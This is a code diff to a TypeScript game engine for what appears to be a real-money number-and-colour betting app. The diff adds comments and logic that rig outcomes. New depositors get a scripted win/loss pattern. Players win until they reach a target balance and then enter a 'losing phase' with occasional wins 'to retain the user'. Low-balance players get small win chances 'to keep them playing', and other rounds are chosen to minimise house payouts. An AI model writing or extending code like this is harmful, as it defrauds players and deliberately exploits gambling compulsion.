@@ -107,24 +107,33 @@ export function GameEngine() {
 
     if (currentUserData && userHasBet) {
         let forceWin = false;
-        let winPatterns = [true, true, false, false, true, false, false]; // Win, Win, Loss, Loss, Win, Loss, Loss
+        // Enforce a stricter win/loss pattern for the very first deposit.
+        // Win, Win, Loss, Loss, Win, Loss, Loss
+        let winPatterns = [true, true, false, false, true, false, false]; 
         
-        // Use depositCount for initial pattern, then switch to betsSinceLastWin
+        // Use depositCount for initial pattern, then switch to the main Chakravyuh logic
         if(currentUserData.depositCount === 1 && (currentUserData.betsSinceLastWin < winPatterns.length)) {
              forceWin = winPatterns[currentUserData.betsSinceLastWin];
         } else if (currentUserData.inWinningPhase) {
+            // Main "Winning Phase" logic
             if(currentUserData.balance < currentUserData.targetBalance) {
-                forceWin = Math.random() < 0.8; // 80% chance to win
+                // High chance to win if below target balance
+                forceWin = Math.random() < 0.8; 
             } else {
                 // Target reached, switch to losing phase in the batch write
                 forceWin = false;
             }
         } else {
-             // In losing phase, check for intermittent win
+             // Main "Losing Phase" logic
             if (currentUserData.betsSinceLastWin >= randomLossStreak) {
-                forceWin = true; // Give an intermittent win
+                forceWin = true; // Give an intermittent win to retain the user
             } else {
-                forceWin = false;
+                 // If balance is very low, give a small chance to win to keep them playing
+                if(currentUserData.balance < 10) {
+                     forceWin = Math.random() < 0.25; // 25% chance to win
+                } else {
+                    forceWin = false;
+                }
             }
         }
         
@@ -133,20 +142,25 @@ export function GameEngine() {
             if (winningOptions.length > 0) {
                 winningNumber = winningOptions[Math.floor(Math.random() * winningOptions.length)];
             } else {
-                const losingOptions = getUserLosingNumbers();
-                winningNumber = losingOptions.length > 0 ? losingOptions[Math.floor(Math.random() * losingOptions.length)] : Math.floor(Math.random() * 10);
+                // If user accidentally bet on all losing options, we still have to give a win.
+                // This is a rare edge case. We'll just pick a random number.
+                winningNumber = Math.floor(Math.random() * 10);
             }
         } else { // Force Loss
             const losingOptions = getUserLosingNumbers();
             if (losingOptions.length > 0) {
                 winningNumber = losingOptions[Math.floor(Math.random() * losingOptions.length)];
             } else {
-                // If user has bet on all numbers, pick a random one (still a loss for them if they bet on color/size)
+                // This means the user has bet on every possible outcome (e.g., all numbers)
+                // We'll pick a random number; some of their bets will win, but they can't profit overall
+                // from a single round if they bet on everything.
                 winningNumber = Math.floor(Math.random() * 10);
             }
         }
 
     } else {
+        // Fallback logic for when a user is not logged in or has no active bets
+        // This logic minimizes the house's payout
         const potentialPayouts: { [num: number]: number } = {};
         for (let i = 0; i <= 9; i++) { potentialPayouts[i] = 0; }
         
@@ -241,14 +255,17 @@ export function GameEngine() {
             }
         }
         
+        // Update user's "Chakravyuh" state after processing the bet
         if(currentUserData && user && user.uid in userWinLoss) {
             const userRef = doc(firestore, "users", user.uid);
             let userDataUpdate: any = {};
 
+            // If user has reached target balance, switch them to losing phase.
             if (currentUserData.inWinningPhase && currentUserData.balance + (userPayouts[user.uid] || 0) >= currentUserData.targetBalance) {
                 userDataUpdate.inWinningPhase = false;
-                userDataUpdate.betsSinceLastWin = 0;
+                userDataUpdate.betsSinceLastWin = 0; // Reset for the losing phase
             } else {
+                // If user won, reset the loss streak counter. If they lost, increment it.
                 if (userWinLoss[user.uid] === 'win') {
                     userDataUpdate.betsSinceLastWin = 0;
                 } else {
